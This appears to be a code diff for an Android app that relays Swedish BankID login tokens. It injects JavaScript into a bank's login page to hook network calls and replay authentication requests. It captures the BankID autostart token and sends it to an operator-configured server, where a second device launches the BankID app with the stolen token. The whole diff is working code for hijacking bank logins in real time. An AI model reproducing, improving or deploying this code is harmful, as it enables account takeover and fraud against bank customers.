@@ -6,6 +6,7 @@ import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
+import android.graphics.Bitmap
 import android.graphics.Color
 import android.net.Uri
 import android.os.Bundle
@@ -19,6 +20,7 @@ import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.Button
 import android.widget.EditText
+import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
 import java.io.BufferedReader
@@ -28,7 +30,11 @@ import java.net.URL
 class MainActivity : Activity() {
 
     private lateinit var web: WebView
+    private lateinit var webWrap: FrameLayout
+    private var popup: WebView? = null
     private lateinit var bar: TextView
+    private lateinit var urlView: TextView
+    private lateinit var debugView: TextView
     private lateinit var linkView: TextView
     private lateinit var serverField: EditText
     private lateinit var bankField: EditText
@@ -36,29 +42,53 @@ class MainActivity : Activity() {
     private lateinit var inBtn: Button
     private lateinit var p: SharedPreferences
 
-    private var baseUrl = ""
-    private var bankUrl = ""
-    private var last = ""
-    private var loginUrl = ""
-    private var kund = true
-    private var skickat = false
-    private var signerad = false
-    private var skapar = false
-    private var vantande = ""
-    private var alive = true
+    @Volatile private var baseUrl = ""
+    @Volatile private var bankUrl = ""
+    @Volatile private var nuUrl = ""
+    @Volatile private var last = ""
+    @Volatile private var loginStam = ""
+    @Volatile private var kund = true
+    @Volatile private var skickat = false
+    @Volatile private var signerad = false
+    @Volatile private var tarIn = false
+    @Volatile private var vantande = ""
+    @Volatile private var vantandeHel = ""
+    @Volatile private var alive = true
+    @Volatile private var efterUrl = ""
+    @Volatile private var skapar = false
 
     private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
+        "function K(u,m,b,h){try{" +
+        "if(!u)return;u=String(u);" +
+        "if(u.indexOf('http')===0&&u.indexOf(location.host)<0)return;" +
+        "if(!/status|collect|poll|pending|order|state|progress|bankid|auth/i.test(u))return;" +
+        "var g=!/post/i.test(m||'GET');" +
+        "if(!window.__son||g){window.__son={url:u,method:m||'GET',body:b||null,headers:h||{}};" +
+        "try{Relay.svar('SON|'+(m||'GET')+' '+u.slice(0,70))}catch(e){}}" +
+        "}catch(e){}}" +
+        "var F=window.fetch;if(F){window.fetch=function(){var a=arguments,u='',m='GET',b=null,h={};" +
+        "try{u=(a[0]&&a[0].url)?a[0].url:a[0];" +
+        "if(a[1]){if(a[1].method)m=a[1].method;if(a[1].body)b=a[1].body;" +
+        "if(a[1].headers){try{new Headers(a[1].headers).forEach(function(v,k){h[k]=v})}catch(e){}}}}catch(e){}" +
+        "var q=F.apply(this,a);" +
+        "try{q.then(function(){try{K(u,m,b,h)}catch(e){}}).catch(function(){})}catch(e){}return q}}" +
+        "var O=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{this.__u=u;this.__m=m;this.__h={}}catch(e){}return O.apply(this,arguments)};" +
+        "var SH=XMLHttpRequest.prototype.setRequestHeader;XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{this.__h[k]=v}catch(e){}return SH.apply(this,arguments)};" +
+        "var S=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){var x=this;" +
+        "try{x.addEventListener('load',function(){K(x.__u,x.__m,b,x.__h)})}catch(e){}return S.apply(this,arguments)};" +
+        "window.__replay=function(){if(!window.__son){try{Relay.svar('INGEN-SON')}catch(e){}return}var s=window.__son;" +
+        "try{fetch(s.url,{method:s.method,headers:s.headers,body:(/post/i.test(s.method)?s.body:null),credentials:'include'})" +
+        ".then(function(r){return r.text()}).then(function(t){try{Relay.svar('SVAR|'+s.method+' '+String(t).slice(0,90))}catch(e){}})" +
+        ".catch(function(){try{Relay.svar('REPLAY-FEL')}catch(e){}})}catch(e){try{Relay.svar('REPLAY-EX')}catch(e){}}};" +
         "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
         "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
-        "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"
+        "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(a.href)}}catch(e){}},700)})()"
 
     private val nudge = "(function(){" +
         "try{window.dispatchEvent(new Event('blur'))}catch(e){}" +
         "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
         "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
-        "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}" +
-        "try{document.dispatchEvent(new Event('resume'))}catch(e){}" +
-        "try{document.dispatchEvent(new Event('resume'))}catch(e){}})()"
+        "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}})()"
 
     override fun onCreate(b: Bundle?) {
         super.onCreate(b)
@@ -83,6 +113,11 @@ class MainActivity : Activity() {
         } catch (t: Throwable) {}
     }
 
+    override fun onPause() {
+        super.onPause()
+        try { if (::web.isInitialized) web.onPause() } catch (t: Throwable) {}
+    }
+
     override fun onNewIntent(i: Intent?) {
         super.onNewIntent(i)
         if (i != null) handleIntent(i)
@@ -90,9 +125,15 @@ class MainActivity : Activity() {
 
     private fun handleIntent(i: Intent) {
         if (i.action != Intent.ACTION_VIEW) return
+        setIntent(i)
         val s = i.data?.toString() ?: return
-        val t = tok(s) ?: return
-        grab(t)
+        val t = tok(s)
+        if (t == null) {
+            if (s.startsWith("bankid:") || s.startsWith("intent:")) oppnaApp(s)
+            return
+        }
+        grab(t, s)
+        if (!kund) startaBankIdFranIntent(i)
     }
 
     private fun ui() {
@@ -112,7 +153,8 @@ class MainActivity : Activity() {
         run.setOnClickListener {
             baseUrl = serverField.text.toString().trim().trimEnd('/')
             p.edit().putString("base", baseUrl).apply()
-            last = ""; skickat = false; signerad = false; loginUrl = ""
+            last = ""; skickat = false; signerad = false; tarIn = false
+            loginStam = ""; efterUrl = ""
             inBtn.isEnabled = false
             if ((p.getString("code", "") ?: "").isEmpty()) newSession()
             bar.text = "laddar banksidan"
@@ -151,15 +193,31 @@ class MainActivity : Activity() {
         root.addView(rad2)
 
         bar = TextView(this)
-        bar.textSize = 11f
+        bar.textSize = 12f
         bar.setBackgroundColor(Color.parseColor("#101010"))
         bar.setTextColor(Color.parseColor("#66ff88"))
         bar.setPadding(14, 8, 14, 6)
         bar.text = "redo"
         root.addView(bar)
 
+        urlView = TextView(this)
+        urlView.textSize = 10f
+        urlView.setBackgroundColor(Color.parseColor("#101010"))
+        urlView.setTextColor(Color.parseColor("#888888"))
+        urlView.setPadding(14, 2, 14, 6)
+        urlView.text = "url"
+        root.addView(urlView)
+
+        debugView = TextView(this)
+        debugView.textSize = 10f
+        debugView.setBackgroundColor(Color.parseColor("#101010"))
+        debugView.setTextColor(Color.parseColor("#ddaa44"))
+        debugView.setPadding(14, 2, 14, 6)
+        debugView.text = "relay"
+        root.addView(debugView)
+
         linkView = TextView(this)
-        linkView.textSize = 11f
+        linkView.textSize = 12f
         linkView.setTextIsSelectable(true)
         linkView.setBackgroundColor(Color.parseColor("#101010"))
         linkView.setTextColor(Color.parseColor("#66ccff"))
@@ -183,61 +241,84 @@ class MainActivity : Activity() {
                 return fanga(r.url.toString())
             }
 
+            override fun onPageStarted(v: WebView, url: String?, f: Bitmap?) {
+                if (url != null) nuUrl = url
+                try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
+            }
+
             override fun onPageFinished(v: WebView, url: String?) {
+                if (url != null) nuUrl = url
                 try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
             }
 
             override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                 if (url == null) return
+                nuUrl = url
                 var s = url.replace("https://", "").replace("http://", "")
                 if (s.length > 62) s = s.substring(0, 62)
-                bar.text = s
+                urlView.text = s
+                if (signerad && efterUrl.isEmpty() && loginStam.isNotEmpty() &&
+                    stam(url) != loginStam) efterUrl = url
             }
         }
 
         web.webChromeClient = object : WebChromeClient() {
+
             override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
                 val pop = WebView(this@MainActivity)
                 pop.settings.javaScriptEnabled = true
+                pop.settings.domStorageEnabled = true
                 pop.webViewClient = object : WebViewClient() {
                     override fun shouldOverrideUrlLoading(v2: WebView, r: WebResourceRequest): Boolean {
                         val s = r.url.toString()
-                        if (fanga(s)) return true
+                        if (fanga(s)) { stangPopup(); return true }
                         try { web.loadUrl(s) } catch (x: Throwable) {}
+                        stangPopup()
                         return true
                     }
                 }
+                pop.webChromeClient = this
+                popup = pop
+                webWrap.addView(pop, FrameLayout.LayoutParams(
+                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))
                 try {
                     (msg.obj as WebView.WebViewTransport).webView = pop
                     msg.sendToTarget()
-                } catch (x: Throwable) {
-                    return false
-                }
+                } catch (x: Throwable) { stangPopup(); return false }
                 return true
             }
+
+            override fun onCloseWindow(window: WebView?) { stangPopup() }
         }
 
         web.addJavascriptInterface(Bridge(), "Relay")
 
-        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
+        webWrap = FrameLayout(this)
+        webWrap.addView(web, FrameLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))
+        root.addView(webWrap, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
         setContentView(root)
+    }
+
+    private fun stangPopup() {
+        val pop = popup ?: return
+        try { webWrap.removeView(pop); pop.destroy() } catch (x: Throwable) {}
+        popup = null
     }
 
     private fun fanga(s: String): Boolean {
         val t = tok(s)
         if (t != null) {
-            grab(t)
+            grab(t, s)
+            if (!kund) startaBankId(s)
             return true
         }
-        if (s.startsWith("bankid:")) return true
+        if (s.startsWith("bankid:")) {
+            if (!kund) startaBankId(s)
+            return true
+        }
         if (s.startsWith("intent:")) {
-            if (!kund) {
-                try {
-                    val i = Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    startActivity(i)
-                } catch (x: Throwable) {}
-            }
+            if (!kund) oppnaApp(s)
             return true
         }
         return false
@@ -245,62 +326,133 @@ class MainActivity : Activity() {
 
     private inner class Bridge {
         @JavascriptInterface
-        fun tok(t: String) {
-            runOnUiThread { grab(t) }
+        fun tok(hel: String) {
+            val t = this@MainActivity.tok(hel) ?: return
+            runOnUiThread { grab(t, hel) }
+        }
+
+        @JavascriptInterface
+        fun svar(s: String) {
+            runOnUiThread { debugView.text = s }
         }
     }
 
     private fun tok(s: String): String? {
-        val m = Regex("[?&]autostarttoken=([^&#]+)").find(s)
-        if (m == null) return null
+        val m = Regex("[?&]autostarttoken=([^&#]+)").find(s) ?: return null
         val v = Uri.decode(m.groupValues[1])
         if (v.isEmpty() || v == "null") return null
         return v
     }
 
-    private fun grab(t: String) {
+    private fun redirect(s: String): String? {
+        val m = Regex("[?&]redirect=([^&#]+)").find(s) ?: return null
+        val v = Uri.decode(m.groupValues[1])
+        if (v.isEmpty() || v == "null") return null
+        return v
+    }
+
+    private fun stam(u: String): String = try {
+        val x = Uri.parse(u)
+        (x.scheme ?: "") + "://" + (x.host ?: "") + (x.path ?: "")
+    } catch (t: Throwable) { u }
+
+    private fun esc(s: String) = s.replace("\\", "\\\\").replace("\"", "\\\"")
+
+    private fun grab(t: String, hel: String = "") {
         if (t == last) return
         last = t
-        loginUrl = try { web.url ?: "" } catch (x: Throwable) { "" }
+        loginStam = stam(nuUrl)
         val c = p.getString("code", "") ?: ""
-        if (c.isEmpty()) { newSession(t); return }
-        post("/api/session/" + c + "/token", t)
+        if (c.isEmpty()) { newSession(t, hel); return }
+        skicka(t, hel)
+    }
+
+    private fun skicka(t: String, hel: String) {
+        val c = p.getString("code", "") ?: ""
+        if (c.isEmpty()) return
+        val r = redirect(hel) ?: ""
+        post("/api/session/" + c + "/token",
+            "{\"token\":\"" + esc(t) + "\",\"redirect\":\"" + esc(r) + "\"}")
         skickat = true
         signerad = false
         inBtn.isEnabled = true
         inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
         inBtn.setTextColor(Color.WHITE)
         bar.text = "TOKEN SKICKAT - vanta pa gront"
-        if (!kund) {
-            try {
-                startActivity(Intent(Intent.ACTION_VIEW,
-                    Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
-            } catch (x: Throwable) {}
-        }
+    }
+
+    private fun startaBankId(url: String) {
+        try {
+            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+            i.setPackage("com.bankid.bus")
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(i)
+        } catch (x: Throwable) {}
+    }
+
+    private fun startaBankIdFranIntent(original: Intent) {
+        try {
+            val v = Intent(original)
+            v.component = null
+            v.setPackage("com.bankid.bus")
+            v.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(v)
+        } catch (x: Throwable) {}
+    }
+
+    private fun oppnaApp(s: String): Boolean {
+        return try {
+            val i = if (s.startsWith("intent:")) Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
+                    else Intent(Intent.ACTION_VIEW, Uri.parse(s))
+            i.setComponent(null)
+            i.setSelector(null)
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            if (i.resolveActivity(packageManager) != null) {
+                startActivity(i); true
+            } else {
+                val fb = i.getStringExtra("browser_fallback_url")
+                val pkg = i.`package`
+                when {
+                    fb != null -> { web.loadUrl(fb); true }
+                    pkg != null -> {
+                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + pkg)))
+                        true
+                    }
+                    else -> false
+                }
+            }
+        } catch (x: Throwable) { false }
     }
 
     private fun taIn() {
         if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
+        if (tarIn) return
+        tarIn = true
         Thread {
-            var i = 0
-            while (i < 4) {
-                i++
+            try {
+                var i = 0
+                while (i < 6) {
+                    i++
+                    val n = i
+                    runOnUiThread {
+                        bar.text = "vacker + replay (" + n + "/6)"
+                        try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
+                        try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (x: Throwable) {}
+                    }
+                    try { Thread.sleep(2000) } catch (x: Throwable) {}
+                    val nu = nuUrl
+                    if (loginStam.isNotEmpty() && nu.isNotEmpty() && stam(nu) != loginStam) {
+                        runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
+                        return@Thread
+                    }
+                }
                 runOnUiThread {
-                    bar.text = "vacker bankens sida (" + i + "/4)"
-                    try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
+                    val retur = efterUrl.isNotEmpty() && stam(efterUrl) != loginStam
+                    bar.text = if (retur) "sidan star still - laddar retur-url" else "sidan star still - laddar banksidan"
+                    loginStam = ""
+                    web.loadUrl(if (retur) efterUrl else bankUrl)
                 }
-                try { Thread.sleep(1800) } catch (t: Throwable) {}
-                val nu = try { web.url ?: "" } catch (x: Throwable) { "" }
-                if (loginUrl.isNotEmpty() && nu.isNotEmpty() && nu != loginUrl) {
-                    runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
-                    return@Thread
-                }
-            }
-            runOnUiThread {
-                bar.text = "sidan star still - laddar om"
-                loginUrl = ""
-                web.loadUrl(bankUrl)
-            }
+            } finally { tarIn = false }
         }.start()
     }
 
@@ -316,8 +468,8 @@ class MainActivity : Activity() {
         }
     }
 
-    private fun newSession(after: String? = null) {
-        if (after != null) vantande = after
+    private fun newSession(after: String? = null, hel: String = "") {
+        if (after != null) { vantande = after; vantandeHel = hel }
         if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
         if (skapar) return
         skapar = true
@@ -341,19 +493,14 @@ class MainActivity : Activity() {
                 skapar = false
                 if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
                 p.edit().putString("code", cc).apply()
-                last = ""; skickat = false; signerad = false; loginUrl = ""
+                last = ""; skickat = false; signerad = false; loginStam = ""; efterUrl = ""
                 inBtn.isEnabled = false
                 visaLank(cc)
                 if (vantande.isNotEmpty()) {
-                    val t = vantande
-                    vantande = ""
+                    val t = vantande; val h = vantandeHel
+                    vantande = ""; vantandeHel = ""
                     last = t
-                    post("/api/session/" + cc + "/token", t)
-                    skickat = true
-                    inBtn.isEnabled = true
-                    inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
-                    inBtn.setTextColor(Color.WHITE)
-                    bar.text = "TOKEN SKICKAT - vanta pa gront"
+                    skicka(t, h)
                 }
             }
         }.start()
@@ -393,7 +540,7 @@ class MainActivity : Activity() {
                 val con = URL(b + path).openConnection() as HttpURLConnection
                 con.requestMethod = "POST"
                 con.doOutput = true
-                con.setRequestProperty("Content-Type", "text/plain")
+                con.setRequestProperty("Content-Type", "application/json")
                 con.connectTimeout = 8000
                 con.readTimeout = 8000
                 con.outputStream.write(body.toByteArray())
@@ -406,10 +553,12 @@ class MainActivity : Activity() {
 
     override fun onDestroy() {
         alive = false
+        stangPopup()
         super.onDestroy()
     }
 
     override fun onBackPressed() {
+        if (popup != null) { stangPopup(); return }
         if (web.canGoBack()) web.goBack() else super.onBackPressed()
     }
 }
